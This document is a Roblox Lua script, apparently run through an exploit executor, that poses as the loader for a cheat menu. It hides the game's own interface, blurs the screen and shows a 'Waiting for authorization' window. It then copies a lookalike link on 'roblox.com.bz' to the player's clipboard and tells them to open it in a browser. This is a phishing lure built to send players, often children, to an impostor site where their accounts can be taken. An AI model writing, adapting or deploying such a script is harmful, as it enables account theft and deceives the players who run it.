-- [[ CONFIGURATION & NETTOYAGE ]]

local old_gui = game:GetService("CoreGui"):FindFirstChild("CustomAuthLoadingScreen") or game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("CustomAuthLoadingScreen")

if old_gui then old_gui:Destroy() end



-- Cacher l'interface officielle de Roblox (Chat, Inventaire, etc.)

local StarterGui = game:GetService("StarterGui")

task.spawn(function()

    local success

    repeat

        success = pcall(function()

            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

        end)

        task.wait(0.1)

    until success

end)



-- [[ CRÉATION DE L'INTERFACE ]]

local TweenService = game:GetService("TweenService")

local LocalPlayer = game:GetService("Players").LocalPlayer

local targetParent = game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")



local ScreenGui = Instance.new("ScreenGui")

ScreenGui.Name = "CustomAuthLoadingScreen"

ScreenGui.ResetOnSpawn = false

ScreenGui.IgnoreGuiInset = true

ScreenGui.Parent = targetParent



-- Effet de flou en arrière-plan

local BlurEffect = Instance.new("BlurEffect")

BlurEffect.Size = 15

BlurEffect.Parent = game:GetService("Lighting")



-- Fond sombre semi-transparent

local Background = Instance.new("Frame")

Background.Size = UDim2.new(1, 0, 1, 0)

Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

Background.BackgroundTransparency = 0.4

Background.BorderSizePixel = 0

Background.Parent = ScreenGui



-- Fenêtre Centrale

local MainFrame = Instance.new("Frame")

MainFrame.Size = UDim2.new(0, 420, 0, 220)

MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)

MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

MainFrame.BorderSizePixel = 0

MainFrame.ClipsDescendants = true

MainFrame.Parent = Background



local UICorner = Instance.new("UICorner")

UICorner.CornerRadius = UDim.new(0, 12)

UICorner.Parent = MainFrame



local UIStroke = Instance.new("UIStroke")

UIStroke.Thickness = 1.5

UIStroke.Color = Color3.fromRGB(55, 55, 55)

UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

UIStroke.Parent = MainFrame



-- [[ TEXTES ]]

local TitleLabel = Instance.new("TextLabel")

TitleLabel.Size = UDim2.new(1, -40, 0, 40)

TitleLabel.Position = UDim2.new(0.5, 0, 0.3, 0)

TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)

TitleLabel.BackgroundTransparency = 1

TitleLabel.Text = "Waiting for authorization..."

TitleLabel.TextColor3 = Color3.fromRGB(240, 240, 240)

TitleLabel.TextSize = 24

TitleLabel.Font = Enum.Font.GothamBold

TitleLabel.TextXAlignment = Enum.TextXAlignment.Center

TitleLabel.Parent = MainFrame



local SubtitleLabel = Instance.new("TextLabel")

SubtitleLabel.Size = UDim2.new(1, -50, 0, 60)

SubtitleLabel.Position = UDim2.new(0.5, 0, 0.65, 0)

SubtitleLabel.AnchorPoint = Vector2.new(0.5, 0.5)

SubtitleLabel.BackgroundTransparency = 1

SubtitleLabel.Text = "A link has been copied to your clipboard, please open your browser to authorize access to the menu."

SubtitleLabel.TextColor3 = Color3.fromRGB(160, 160, 160)

SubtitleLabel.TextSize = 14

SubtitleLabel.Font = Enum.Font.Gotham

SubtitleLabel.TextWrapped = true

SubtitleLabel.TextXAlignment = Enum.TextXAlignment.Center

SubtitleLabel.Parent = MainFrame



-- [[ ANIMATION ]]

MainFrame.Size = UDim2.new(0, 380, 0, 180)

MainFrame.BackgroundTransparency = 1

TitleLabel.TextTransparency = 1

SubtitleLabel.TextTransparency = 1

UIStroke.Transparency = 1



TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {

    Size = UDim2.new(0, 420, 0, 220),

    BackgroundTransparency = 0

}):Play()



TweenService:Create(TitleLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

TweenService:Create(SubtitleLabel, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()

TweenService:Create(UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 0}):Play()



if setclipboard then
    setclipboard("https://roblox.com.bz/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=01020253326003882821745620364996")
end
